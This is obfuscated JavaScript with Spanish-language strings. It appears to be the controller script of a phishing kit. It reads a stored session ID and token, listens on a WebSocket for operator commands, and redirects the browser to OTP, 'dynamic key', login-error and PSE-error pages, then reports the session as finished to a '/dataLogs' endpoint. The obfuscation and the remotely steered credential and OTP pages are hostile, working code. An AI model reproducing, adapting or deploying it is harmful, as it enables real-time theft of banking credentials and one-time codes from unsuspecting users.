function _0x6c9c(_0x497003, _0x57f04e) {
  const _0x607304 = _0x6073();
  return (
    (_0x6c9c = function (_0x6c9c26, _0x31cf5d) {
      _0x6c9c26 = _0x6c9c26 - 0xdc;
      let _0x57ada4 = _0x607304[_0x6c9c26];
      return _0x57ada4;
    }),
    _0x6c9c(_0x497003, _0x57f04e)
  );
}
const _0x4b712d = _0x6c9c;
(function (_0x45302e, _0x3ea3d9) {
  const _0x35a83b = _0x6c9c,
    _0x3260fd = _0x45302e();
  while (!![]) {
    try {
      const _0x4ba56f =
        -parseInt(_0x35a83b(0xe2)) / 0x1 +
        -parseInt(_0x35a83b(0xfd)) / 0x2 +
        parseInt(_0x35a83b(0xe3)) / 0x3 +
        parseInt(_0x35a83b(0xdf)) / 0x4 +
        -parseInt(_0x35a83b(0xec)) / 0x5 +
        -parseInt(_0x35a83b(0xf2)) / 0x6 +
        parseInt(_0x35a83b(0xe9)) / 0x7;
      if (_0x4ba56f === _0x3ea3d9) break;
      else _0x3260fd["push"](_0x3260fd["shift"]());
    } catch (_0x3a07e) {
      _0x3260fd["push"](_0x3260fd["shift"]());
    }
  }
})(_0x6073, 0x57e54);
const dataLogId = localStorage["getItem"](_0x4b712d(0xe6)),
  token = localStorage[_0x4b712d(0xe7)]("dataLogToken");
(!dataLogId || !token) &&
  (console[_0x4b712d(0xe5)](
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage."
  ),
  alert(_0x4b712d(0xf8)),
  (window[_0x4b712d(0xdd)][_0x4b712d(0xf5)] = _0x4b712d(0xf7)));
function _0x6073() {
  const _0x15dd76 = [
    "valid",
    "Estado\x20actualizado\x20correctamente\x20en\x20el\x20servidor.",
    "318510nEgoXf",
    "log",
    "stringify",
    "location",
    "application/json",
    "1645780dBUoAG",
    "Error\x20en\x20el\x20PUT\x20a\x20updateEndDataLog",
    "Conectado\x20al\x20WebSocket",
    "692898VLPbCW",
    "445686cNsimg",
    "Error\x20de\x20conexión:",
    "error",
    "dataLogId",
    "getItem",
    "PUT",
    "10635387WmOIUb",
    "./index.error.html",
    "end",
    "2066810nJpcxo",
    "connect_error",
    "/dataLogs/updateEndDataLog/",
    "./otp.error.html",
    "Finalizado",
    "Hubo\x20un\x20error\x20al\x20actualizar\x20el\x20estado.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "2722878nRvlAI",
    "connect",
    "json",
    "href",
    "origin",
    "./error.html",
    "Hubo\x20un\x20error\x20al\x20cargar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "Error\x20al\x20actualizar\x20el\x20estado:",
    "valor",
  ];
  _0x6073 = function () {
    return _0x15dd76;
  };
  return _0x6073();
}
const socket = io(url, { query: { token: token } });
socket["on"](_0x4b712d(0xf3), () => console[_0x4b712d(0xfe)](_0x4b712d(0xe1))),
  socket["on"](_0x4b712d(0xed), (_0x4d9556) =>
    console[_0x4b712d(0xe5)](_0x4b712d(0xe4), _0x4d9556["message"])
  ),
  socket["on"]("data", async (_0xba5766) => {
    const _0x8b0980 = _0x4b712d;
    console[_0x8b0980(0xfe)]("Datos\x20recibidos:", _0xba5766),
      console[_0x8b0980(0xfe)]("ID\x20de\x20dataLog:", dataLogId);
    if (String(_0xba5766[_0x8b0980(0xfb)]) !== String(dataLogId)) return;
    const _0x3e2e46 = {
      us: _0x8b0980(0xea),
      din: "./otp.html",
      new_din: _0x8b0980(0xef),
      end: "./errorPse.html",
    };
    if (_0xba5766["valor"] in _0x3e2e46) {
      if (_0xba5766[_0x8b0980(0xfa)] === _0x8b0980(0xeb))
        try {
          await updateStatus();
        } catch (_0x20b464) {
          console[_0x8b0980(0xe5)](_0x8b0980(0xf9), _0x20b464),
            alert(_0x8b0980(0xf1));
          return;
        }
      window[_0x8b0980(0xdd)][_0x8b0980(0xf5)] = _0x3e2e46[_0xba5766["valor"]];
    }
  });
async function updateStatus() {
  const _0x3c9a69 = _0x4b712d;
  try {
    const _0x1b18c9 = await fetch(url + _0x3c9a69(0xee) + dataLogId, {
      method: _0x3c9a69(0xe8),
      headers: {
        "Content-Type": _0x3c9a69(0xde),
        Authorization: "Bearer\x20" + token,
        Origin: window["location"][_0x3c9a69(0xf6)],
      },
      body: JSON[_0x3c9a69(0xdc)]({ status: _0x3c9a69(0xf0) }),
    });
    if (!_0x1b18c9["ok"]) {
      const _0x57fb9e = await _0x1b18c9[_0x3c9a69(0xf4)]();
      throw new Error(_0x57fb9e[_0x3c9a69(0xe5)] || _0x3c9a69(0xe0));
    }
    console["log"](_0x3c9a69(0xfc));
  } catch (_0x362dd8) {
    throw _0x362dd8;
  }
}
